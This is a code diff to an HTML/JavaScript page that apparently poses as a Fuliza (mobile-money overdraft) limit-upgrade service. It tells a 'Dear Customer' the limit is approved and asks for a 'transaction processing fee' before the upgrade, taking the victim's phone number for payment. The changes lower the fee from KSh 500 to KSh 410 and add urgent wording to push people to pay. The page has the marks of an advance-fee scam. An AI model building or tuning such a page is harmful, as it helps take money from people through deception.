@@ -32,15 +32,15 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 <p class="encourage">
 Dear Customer, your Fuliza limit has been approved.  
 To complete the upgrade process, kindly pay the **transaction processing fee** below.  
-This allows our system to finalize the upgrade and automatically refresh your current limit to the new limit you selected.
+This allows our system to finalize the upgrade and automatically refresh your current limit to the new limit you selected. Make sure you completed this steps to refresh your Fuliza Limit Now. 
 </p>
 
 <div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
-<div class="info">Transaction Fee: <strong>KSh 500</strong></div>
+<div class="info">Transaction Fee: <strong>KSh 410</strong></div>
 
 <input type="tel" id="phone" placeholder="Enter your phone number with country code e.g. +2547xxxxxxx">
 
-<button class="pay-btn" onclick="payNow()">Pay KSh 500 Now</button>
+<button class="pay-btn" onclick="payNow()">Pay KSh 410 Now</button>
 
 <div class="spinner" id="spinner"><div class="loader"></div></div>
 <div class="message" id="message"></div>
@@ -58,7 +58,7 @@ const selectedAmount = localStorage.getItem("selectedAmount") || 1000;
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
 // Fixed transaction fee
-const transactionFee = 500; // You had KSh 500
+const transactionFee = 410; // You had KSh 500
 
 // Country detection by prefix
 const countryPrefixes = {
